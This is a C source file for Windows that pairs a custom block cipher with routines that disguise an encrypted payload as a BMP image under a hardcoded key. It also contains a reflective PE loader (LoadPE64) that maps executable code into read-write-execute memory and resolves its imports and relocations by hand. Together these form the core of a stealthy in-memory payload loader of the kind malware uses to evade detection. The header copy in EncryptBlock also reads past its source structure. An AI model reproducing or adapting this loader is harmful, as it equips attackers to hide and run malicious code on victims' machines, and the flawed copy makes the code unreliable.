#include <Windows.h>
#include "encrypt.h"

BYTE	kc;
int		con_num;
BYTE	s_box_tbl[256];
BYTE	basic_tbl[256] = {
	0x7e,0x6a,0x4d,0x1b,0x32,0x1f,0x78,0xde,
	0x4f,0x91,0xab,0x48,0x40,0x72,0x17,0xb2,
	0x96,0x07,0x7c,0xbb,0x68,0x11,0xac,0xbc,
	0xcd,0xd8,0xa0,0xf3,0x9d,0xbd,0xf7,0xc6,
	0x2a,0x14,0x89,0xee,0x1a,0xd2,0x7d,0x63,
	0xf2,0x20,0x4a,0x12,0xa6,0xc1,0x23,0xd6,
	0x01,0x86,0x33,0xaf,0x35,0xdf,0x0a,0xf4,
	0x2f,0xeb,0xb1,0xc2,0x93,0x24,0xe9,0x70,
	0x7b,0xea,0x81,0x0b,0xc3,0xfa,0x25,0xa8,
	0x9f,0xb5,0x5e,0x95,0x3e,0xa5,0x67,0x13,
	0x7f,0xc8,0xe1,0xfb,0xf1,0x44,0x9a,0x54,
	0x99,0x9e,0xa1,0x47,0x1c,0x21,0xde,0x69,
	0x66,0xaa,0xd1,0xad,0xd7,0x3a,0x2e,0x16,
	0x4e,0x22,0x06,0xe5,0xc4,0xe4,0xc7,0x5a,
	0x64,0x85,0x03,0x37,0x74,0xd3,0x3b,0xa9,
	0xda,0xe3,0xff,0xdb,0x00,0xf6,0x75,0xfe,
	0xef,0xbf,0xa2,0xcb,0x8d,0x38,0x8c,0x0c,
	0x87,0x6b,0xb8,0xb7,0xc9,0xd9,0xba,0x8f,
	0x6c,0xfd,0xe7,0x7a,0x71,0xa7,0xbe,0x26,
	0x39,0x82,0x59,0x05,0x02,0xcc,0x15,0xe0,
	0x9b,0x83,0x76,0x28,0x34,0x36,0xe2,0x50,
	0x19,0xc0,0x61,0xcf,0xf8,0xae,0x49,0xd5,
	0xb3,0x77,0xb6,0x1e,0xe8,0xc5,0xd4,0xb9,
	0x46,0x3f,0xed,0x62,0x2b,0x10,0x4c,0x8e,
	0xec,0x2c,0xb4,0x97,0x3c,0xdc,0x52,0x5d,
	0x5b,0xf9,0x18,0x79,0x1d,0x57,0xf5,0x60,
	0x43,0xf0,0x94,0xce,0x56,0x53,0x5f,0x0e,
	0x88,0x6e,0xe6,0x8a,0x30,0x3d,0x92,0x84,
	0x29,0x65,0x2d,0x04,0x4b,0x6f,0x80,0x6d,
	0x5c,0xd0,0x09,0x90,0x8b,0x9c,0x98,0x0d,
	0x08,0x41,0x31,0x55,0x51,0xa3,0xb0,0x58,
	0xca,0x0f,0x73,0xfc,0x27,0xa4,0x42,0x45
};


/*======================================================
func:  F function
input:  inp[], key[], step
output:  outp[]
========================================================*/
void  fFunction(BYTE* inp, BYTE* key, BYTE* outp, int step)
{
	int 	i, j;
	BYTE      temp, overflow = 0;

	j = step * 8;

	for (i = 0; i < 8; i++) {
		temp = inp[i] + key[j + i] + overflow;
		if ((temp < inp[i]) || (temp < key[j + i]) || (temp < overflow))
			overflow = 1;
		else	overflow = 0;
		outp[i] = temp;
	}
	outp[0] += overflow;

	for (i = 0; i < 7; i++) {
		outp[i + 1] ^= outp[i];
	}

	outp[7] = s_box_tbl[outp[7] ^ kc]; outp[6] += outp[7];
	if (outp[6] < outp[7]) outp[6] ++;

	outp[6] = s_box_tbl[outp[6]]; outp[5] += outp[6];
	if (outp[5] < outp[6]) outp[5] ++;

	outp[5] = s_box_tbl[outp[5]]; outp[4] += outp[5];
	if (outp[4] < outp[5]) outp[4] ++;

	outp[4] = s_box_tbl[outp[4]]; outp[3] += outp[4];
	if (outp[3] < outp[4]) outp[3] ++;

	outp[3] = s_box_tbl[outp[3]]; outp[2] += outp[3];
	if (outp[2] < outp[3]) outp[2] ++;

	outp[2] = s_box_tbl[outp[2]]; outp[1] += outp[2];
	if (outp[1] < outp[2]) outp[1] ++;

	outp[1] = s_box_tbl[outp[1]]; outp[0] += outp[1];
	if (outp[0] < outp[1]) outp[0] ++;

	temp = s_box_tbl[outp[0]];  outp[0] = outp[7]; outp[7] = temp;
}


/*======================================================
func:  F function
input:  inp[], key[]
output:  outp[]
========================================================*/
void  kFunction(BYTE * inp, BYTE * key, BYTE * outp)
{
	int 	i;
	BYTE      temp, overflow = 0;

	for (i = 0; i < 8; i++) {
		temp = inp[i] + key[i] + overflow;
		if ((temp < inp[i]) || (temp < key[i]) || (temp < overflow))
			overflow = 1;
		else	overflow = 0;
		outp[i] = temp;
	}
	outp[0] += overflow;

	for (i = 0; i < 7; i++) {
		outp[i + 1] ^= outp[i];
	}

	outp[7] = basic_tbl[outp[7]]; outp[6] += outp[7];
	if (outp[6] < outp[7]) outp[6] ++;

	outp[6] = basic_tbl[outp[6]]; outp[5] += outp[6];
	if (outp[5] < outp[6]) outp[5] ++;

	outp[5] = basic_tbl[outp[5]]; outp[4] += outp[5];
	if (outp[4] < outp[5]) outp[4] ++;

	outp[4] = basic_tbl[outp[4]]; outp[3] += outp[4];
	if (outp[3] < outp[4]) outp[3] ++;

	outp[3] = basic_tbl[outp[3]]; outp[2] += outp[3];
	if (outp[2] < outp[3]) outp[2] ++;

	outp[2] = basic_tbl[outp[2]]; outp[1] += outp[2];
	if (outp[1] < outp[2]) outp[1] ++;

	outp[1] = basic_tbl[outp[1]]; outp[0] += outp[1];
	if (outp[0] < outp[1]) outp[0] ++;

	outp[0] = basic_tbl[outp[0]];
}


/*======================================================
func:
input:
output:
========================================================*/
void KeyProccessProc(BYTE * Key, BYTE * expKey)
{
	int	i, j;
	BYTE	k[32], kk[8], pk[8], wk[8], rotn, temp;
	int	tptr, dptr;

	for (i = 0; i < 32; i++)
		k[i] = Key[i];

	for (i = 0; i < 256; i++)
		s_box_tbl[i] = basic_tbl[i];

	for (i = 0; i < 8; i++)
	{
		rotn = ((Key[i] + i) % 7) + 1;

		for (j = 0; j < 8; j++)
		{
			pk[j] = k[j];
			wk[j] = k[j] ^ k[j + 8];
		}

		for (j = 0; j < 7; j++)
			kk[j] = (wk[j] >> rotn) | (wk[j + 1] << (8 - rotn));

		kk[7] = (wk[0] << (8 - rotn)) | (wk[7] >> rotn);

		kFunction(k, kk, k);

		for (j = 0; j < 8; j++)
		{
			expKey[i * 8 + j] = k[j];
			k[j] += pk[j];
		}
	}

	for (i = 0; i < 8; i++)
	{
		rotn = ((Key[i + 16] + i) % 7) + 1;

		for (j = 0; j < 8; j++)
		{
			pk[j] = k[j];
			wk[j] = k[j] ^ k[j + 8];
		}

		for (j = 0; j < 7; j++)
			kk[j] = (wk[j] >> rotn) | (wk[j + 1] << (8 - rotn));

		kk[7] = (wk[0] << (8 - rotn)) | (wk[7] >> rotn);

		kFunction(k, kk, k);

		for (j = 0; j < 8; j++)
		{
			expKey[(i + 8) * 8 + j] = k[j];
			k[j] += pk[j];
		}
	}
	for (i = 0; i < 32; i += 2) {
		tptr = expKey[i + 96]; dptr = expKey[i + 97];
		temp = s_box_tbl[tptr];
		s_box_tbl[tptr] = s_box_tbl[dptr];
		s_box_tbl[dptr] = temp;
	}
}

/*======================================================
func:
input:
output:
========================================================*/
int  HamingCheckProc(BYTE * op, BYTE * np)
{

	int i, j, hcnt = 0;
	BYTE onp;

	for (i = 0; i < 8; i++)
	{
		onp = op[i] ^ np[i];

		for (j = 0; j < 8; j++)
		{
			hcnt += onp & 1;
			onp = onp >> 1;
		}
	}

	return hcnt;
}

/*======================================================
func:
input:
output:
========================================================*/
void enCipherProc(BYTE * pt, BYTE * expKey, BYTE * ct, int resetFlag)
{
	int  i, j, k = 1;
	BYTE  L[8], R[8], M[8];
	static BYTE eoldc[8], enewc[8], ebkcnt;
	ebkcnt ^= 1;

	if (resetFlag == 0)
	{
		memset(eoldc, 0, 8);
		memset(enewc, 0, 8);
		ebkcnt = 1;  con_num = 80;
		kc = expKey[con_num];
	}

	for (i = 0; i < 8; i++)
	{
		L[i] = pt[i] ^ expKey[i + 72];
		R[i] = pt[i + 8] ^ expKey[i];
	}

	//------- Step 1 ----------
	fFunction(R, expKey, M, k); k++;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 2 ----------
	fFunction(L, expKey, M, k); k++;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	//------- Step 3 ----------
	fFunction(R, expKey, M, k); k++;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 4 ----------
	fFunction(L, expKey, M, k); k++;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	//------- Step 5 ----------
	fFunction(R, expKey, M, k); k++;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 6 ----------
	fFunction(L, expKey, M, k); k++;
	for (j = 0; j < 8; j++) R[j] ^= M[j];
	if (ebkcnt == 0) {
		for (j = 0; j < 8; j++) eoldc[j] = L[j];
	}
	else {
		for (j = 0; j < 8; j++) enewc[j] = L[j];
	}

	//------- Step 7 ----------
	fFunction(R, expKey, M, k); k++;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 8 ----------
	fFunction(L, expKey, M, k); k++;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	for (i = 0; i < 8; i++)
	{
		ct[i] = R[i] ^ expKey[i];
		ct[i + 8] = L[i] ^ expKey[i + 72];
	}
	if (ebkcnt == 1)
	{
		k = HamingCheckProc(eoldc, enewc) + ebkcnt;

		if (k < 28 || k > 36) {
			if (con_num < 96) con_num++;
			else con_num = 80;
			kc = expKey[con_num];
		}
	}
}

/*======================================================
func:
input:
output:
========================================================*/
void deCipherProc(BYTE * ct, BYTE * expKey, BYTE * pt, int resetFlag)
{
	int  i, j, k = 8;
	BYTE  L[8], R[8], M[8];
	static BYTE eoldc[8], enewc[8], ebkcnt;

	if (resetFlag == 0)
	{
		memset(eoldc, 0, 8);
		memset(enewc, 0, 8);
		ebkcnt = 1; con_num = 80;
		kc = expKey[con_num];
	}

	ebkcnt ^= 1;

	for (i = 0; i < 8; i++)
	{
		R[i] = ct[i] ^ expKey[i];
		L[i] = ct[i + 8] ^ expKey[i + 72];
	}

	//------- Step 1 ----------
	fFunction(L, expKey, M, k); k--;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	//------- Step 2 ----------
	fFunction(R, expKey, M, k); k--;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 3 ----------
	fFunction(L, expKey, M, k); k--;
	for (j = 0; j < 8; j++) R[j] ^= M[j];
	if (ebkcnt == 0) {
		for (j = 0; j < 8; j++) eoldc[j] = L[j];
	}
	else {
		for (j = 0; j < 8; j++) enewc[j] = L[j];
	}

	//------- Step 4 ----------
	fFunction(R, expKey, M, k); k--;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 5 ----------
	fFunction(L, expKey, M, k); k--;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	//------- Step 6 ----------
	fFunction(R, expKey, M, k); k--;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	//------- Step 7 ----------
	fFunction(L, expKey, M, k); k--;
	for (j = 0; j < 8; j++) R[j] ^= M[j];

	//------- Step 8 ----------
	fFunction(R, expKey, M, k); k--;
	for (j = 0; j < 8; j++) L[j] ^= M[j];

	for (i = 0; i < 8; i++)
	{
		pt[i] = L[i] ^ expKey[i + 72];
		pt[i + 8] = R[i] ^ expKey[i];
	}

	if (ebkcnt == 1)
	{
		k = HamingCheckProc(eoldc, enewc) + ebkcnt;

		if (k < 28 || k > 36) {
			if (con_num < 96) con_num++;
			else con_num = 80;
			kc = expKey[con_num];
		}
	}
}

void MyHash(BYTE * pbData, int nDataLen, BYTE * pbOut)
{
	int		i, nBlockNum;
	BYTE	pbExpKey[128];

	memset(pbOut, 0, 16);
	nBlockNum = nDataLen / 32;
	for (i = 0; i < nBlockNum; i++)
	{
		KeyProccessProc(pbData + i * 32, pbExpKey);
		enCipherProc(pbOut, pbExpKey, pbOut, 0);
	}
}

BYTE* EncryptBlock(BYTE* pbBlock, int nLen, ULONG& nOutLen)
{
	BITMAPFILEHEADER	bf;
	BITMAPINFOHEADER	bi;
	int					i, nSize;
	BYTE				pbKey[32], pbExpKey[128];

	nSize = nLen + 4;
	nSize = ((nSize + 2047) / 2048) * 2048;

	memcpy(pbKey, "AKDICVMXJASLEIDK3IR54KDFKDJDlaia", 32);
	KeyProccessProc(pbKey, pbExpKey);
	memset(&bf, 0, sizeof(BITMAPFILEHEADER));
	memset(&bi, 0, sizeof(BITMAPINFOHEADER));
	bf.bfType = 0x4D42;
	bf.bfOffBits = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
	bf.bfSize = nSize + bf.bfOffBits;
	bi.biBitCount = 32;
	bi.biHeight = nSize / 2048;
	bi.biWidth = 512;
	bi.biPlanes = 1;
	bi.biSize = sizeof(BITMAPINFOHEADER);

	BYTE * pbBuffer;

	pbBuffer = new BYTE[bf.bfSize];
	memcpy(pbBuffer, &bf, bf.bfSize);
	memcpy(pbBuffer + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
	memcpy(pbBuffer + bf.bfOffBits, &nLen, 4);
	memcpy(pbBuffer + bf.bfOffBits + 4, pbBlock, nLen);
	nSize /= 16;
	for (i = 0; i < nSize; i++)
	{
		memcpy(pbExpKey, &i, sizeof(int));
		enCipherProc(pbBuffer + bf.bfOffBits + i * 16, pbExpKey, pbBuffer + bf.bfOffBits + i * 16, 0);
	}
	nOutLen = bf.bfSize;
	return pbBuffer;
}


BYTE* DecryptBlock(BYTE* pbBlock, int nLen, ULONG& nOutLen)
{
	BYTE				pbKey[32], pbExpKey[128];
	BYTE* pbBuffer;

	memcpy(pbKey, "AKDICVMXJASLEIDK3IR54KDFKDJDlaia", 32);
	KeyProccessProc(pbKey, pbExpKey);

	int			i, nSize;

	nSize = (nLen - 40) / 16;

	for (i = 0; i < nSize; i++)
	{
		memcpy(pbExpKey, &i, sizeof(int));
		deCipherProc(pbBlock + 40 + i * 16, pbExpKey, pbBlock + 40 + i * 16, 0);
	}
	nOutLen = *(int*)(pbBlock + 40);
	pbBuffer = new BYTE[nOutLen];

	if (nLen >= nOutLen + 44)
		memcpy(pbBuffer, pbBlock + 44, nOutLen);

	return pbBuffer;
}


PVOID LoadPE64(PVOID pBuffer)
{
	// the initial location of this image in memory
	ULONG_PTR uiLibraryAddress = (ULONG_PTR)pBuffer;
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR uiBaseAddress;

	// variables for processing the kernels export table
	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;

	while (uiValueA--)
		*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;

	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);

	// itterate through all sections, loading them into memory.
	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		// uiValueB is the VA for this section
		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

		// uiValueC if the VA for this sections data
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		while (uiValueD--)
			*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;

		// get the VA of the next section
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}

	// STEP 4: process our images import table...

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

	// itterate through all imports
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)LoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(uiValueA))
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

				// get the VA of the export directory
				uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

				// get the VA for the array of addresses
				uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = (uiBaseAddress + DEREF(uiValueA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
			}
			// get the next imported function
			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}

		// get the next import
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}

	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// check if their are any relocations present
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

		// and we itterate through all entries...
		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
		{
			// uiValueA = the VA for this relocation block
			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while (uiValueB--)
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
					*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	return (PVOID)uiBaseAddress;
}
